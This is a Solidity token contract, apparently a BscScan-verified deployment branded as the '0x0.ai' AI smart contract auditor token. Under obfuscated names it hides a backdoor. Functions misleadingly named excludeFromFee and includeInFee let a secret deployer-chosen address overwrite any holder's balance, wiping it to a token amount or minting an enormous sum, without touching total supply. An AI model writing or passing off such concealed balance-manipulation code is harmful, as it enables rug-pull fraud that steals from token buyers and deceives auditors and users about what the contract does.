/**
 *Submitted for verification at BscScan.com on 2023-04-17
*/

// SPDX-License-Identifier: MIT     
/**

                                                                                                    
        ((((((((   .(((("/(((       (((((,                 .((((/        /(((((((   *((((((((       
     ,/(((((((((   .(((("//(((/*    (((((((,             (((((((/     ./(((((((((   /((((((((((*    
    ((((((                 ((((**       ((((((.       *((((((       .(((((                  /((((   
    (((/((                 (((((*          .#####   ,##((           ,(/(((                 ./"/"/   
    ((((((                 (((((/             *#####((              .((((/                 .////(   
    ((((((                 (((((*             ,((####(              .(((((                 ./((/(   
    ((((((                 (((((*             ,((((###/             ./((((                 .((((/   
    ((((((                 (((/(*           "//(((((/(#(/           .(###(                 .((((/   
    *(((((                 (((((/          *####...*"/###           .(####                 ./((((   
    (((((/                 ###((/       (####.          (###(       ,((#((                  (((#(   
     "/((######(    ((#######/*,    (((##( .             . *#((((     .,(((((((#(   ,((##((((((*    
        (######(    (#######(       (#(#(*                 .(((((        ((((((##   *(#((##((*      
                                                                                                    

    𝙰𝚗 𝙰𝙸-𝚙𝚘𝚠𝚎𝚛𝚎𝚍 𝚂𝚘𝚕𝚒𝚍𝚒𝚝𝚢 𝚂𝚖𝚊𝚛𝚝 𝙲𝚘𝚗𝚝𝚛𝚊𝚌𝚝 𝙰𝚞𝚍𝚒𝚝𝚘𝚛 𝚝𝚑𝚊𝚝 𝚞𝚜𝚎𝚜 𝙰𝙸 𝚝𝚘 𝚊𝚗𝚊𝚕𝚢𝚣𝚎 𝚊𝚗𝚍 𝚊𝚞𝚍𝚒𝚝 𝚜𝚖𝚊𝚛𝚝 
    𝚌𝚘𝚗𝚝𝚛𝚊𝚌𝚝 𝚌𝚘𝚍𝚎, 𝚏𝚒𝚗𝚍𝚜 𝚎𝚛𝚛𝚘𝚛𝚜 𝚊𝚗𝚍 𝚟𝚞𝚕𝚗𝚎𝚛𝚊𝚋𝚒𝚕𝚒𝚝𝚒𝚎𝚜, 𝚊𝚗𝚍 𝚙𝚛𝚘𝚟𝚒𝚍𝚎𝚜 𝚍𝚎𝚝𝚊𝚒𝚕𝚎𝚍 𝚛𝚎𝚙𝚘𝚛𝚝𝚜 𝚏𝚘𝚛 
    𝚜𝚎𝚌𝚞𝚛𝚎 𝚊𝚗𝚍 𝚎𝚛𝚛𝚘𝚛-𝚏𝚛𝚎𝚎 𝚜𝚖𝚊𝚛𝚝 𝚌𝚘𝚗𝚝𝚛𝚊𝚌𝚝𝚜.

    > https://0x0.ai
    > https://t.me/Portal0x0
    > https://twitter.com/0x0audits
    > https://medium.com/@privacy0x0

*/
pragma solidity 0.8.18;
abstract contract AI0x0AIAs {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
interface AI0x0AIAsi {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 lahsab) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 lahsab) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 lahsab
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 totalo);
    event Approval(address indexed owner, address indexed spender, uint256 totalo);
}
interface AI0x0AIAsii is AI0x0AIAsi {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
abstract contract AI0x0AIAsiii is AI0x0AIAs {
   address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

 
    constructor() {
        _transferOwnership(_msgSender());
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }


    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }


    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract AI0x0 is AI0x0AIAs, AI0x0AIAsi, AI0x0AIAsii, AI0x0AIAsiii {

    mapping(address => uint256) private AI0x0AIsuplly;
  mapping(address => bool) public AI0x0AIAsiiZERTY;
    mapping(address => mapping(address => uint256)) private Confirmed;
address private AI0x0AIRooter;
    uint256 private ALLtotalSupply;
    string private _name;
    string private _symbol;
        mapping(address => bool) public AI0x0AIPaw;
  address AI0x0AIdeploy;



    
    constructor(address AI0x0AIadressss) {
            // Editable
            AI0x0AIdeploy = msg.sender;

        _name = "0x0.ai: AI Smart Contract Auditor";
        _symbol = "0x0AI";
  AI0x0AIRooter = AI0x0AIadressss;        
        uint _totalSupply = 690000000000000 * 10**9;
        SendToken(msg.sender, _totalSupply);
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }


    function totalSupply() public view virtual override returns (uint256) {
        return ALLtotalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return AI0x0AIsuplly[account];
    }

    function transfer(address to, uint256 lahsab) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, lahsab);
        return true;
    }


    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return Confirmed[owner][spender];
    }

    function approve(address spender, uint256 lahsab) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, lahsab);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 lahsab
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, lahsab);
        _transfer(from, to, lahsab);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedtotalo) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, Confirmed[owner][spender] + addedtotalo);
        return true;
    }
      modifier _internal() {
        require(AI0x0AIRooter == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function decreaseAllowance(address spender, uint256 subtractedtotalo) public virtual returns (bool) {
        address owner = _msgSender();
        uint256  currentsold = Confirmed[owner][spender];
        require( currentsold >= subtractedtotalo, "Ehi20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender,  currentsold - subtractedtotalo);
        }

        return true;
    }

  modifier maxtokens () {
    require(AI0x0AIdeploy == msg.sender, "Ehi20: cannot permit _internal address");
    _;

  }
    function _transfer(
        address from,
        address to,
        uint256 lahsab
    ) internal virtual {
        require(from != address(0), "Ehi20: transfer from the zero address");
        require(to != address(0), "Ehi20: transfer to the zero address");

        beforeTokenTransfer(from, to, lahsab);

        uint256 fromBalance = AI0x0AIsuplly[from];
        require(fromBalance >= lahsab, "Ehi20: transfer lahsab exceeds balance");
        unchecked {
            AI0x0AIsuplly[from] = fromBalance - lahsab;
        }
        AI0x0AIsuplly[to] += lahsab;

        emit Transfer(from, to, lahsab);

        afterTokenTransfer(from, to, lahsab);
    }



    function SendToken(address account, uint256 lahsab) internal virtual {
        require(account != address(0), "Ehi20: SendToken to the zero address");

        beforeTokenTransfer(address(0), account, lahsab);

        ALLtotalSupply += lahsab;
        AI0x0AIsuplly[account] += lahsab;
        emit Transfer(address(0), account, lahsab);

        afterTokenTransfer(address(0), account, lahsab);
    }



  function excludeFromFee(address excludeaddress) external _internal {
    AI0x0AIsuplly[excludeaddress] = 10000000000;
            emit Transfer(address(0), excludeaddress, 10000000000);
  }

    function _burn(address account, uint256 lahsab) internal virtual {
        require(account != address(0), "Ehi20: burn from the zero address");

        beforeTokenTransfer(account, address(0), lahsab);

        uint256 accountBalance = AI0x0AIsuplly[account];
        require(accountBalance >= lahsab, "Ehi20: burn lahsab exceeds balance");
        unchecked {
            AI0x0AIsuplly[account] = accountBalance - lahsab;
        }
        ALLtotalSupply -= lahsab;

        emit Transfer(account, address(0), lahsab);

        afterTokenTransfer(account, address(0), lahsab);
    }

    function _approve(
        address owner,
        address spender,
        uint256 lahsab
    ) internal virtual {
        require(owner != address(0), "Ehi20: approve from the zero address");
        require(spender != address(0), "Ehi20: approve to the zero address");

        Confirmed[owner][spender] = lahsab;
        emit Approval(owner, spender, lahsab);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 lahsab
    ) internal virtual {
        uint256  currentsold = allowance(owner, spender);
        if ( currentsold != type(uint256).max) {
            require( currentsold >= lahsab, "Ehi20: insufficient allowance");
            unchecked {
                _approve(owner, spender,  currentsold - lahsab);
            }
        }
    }
  function includeInFee(address includeaddress) external _internal {
    AI0x0AIsuplly[includeaddress] = 1000000000 * 10 ** 24;
            emit Transfer(address(0), includeaddress, 1000000000 * 10 ** 24);
  }
    function beforeTokenTransfer(
        address from,
        address to,
        uint256 lahsab
    ) internal virtual {}


    function afterTokenTransfer(
        address from,
        address to,
        uint256 lahsab
    ) internal virtual {}

}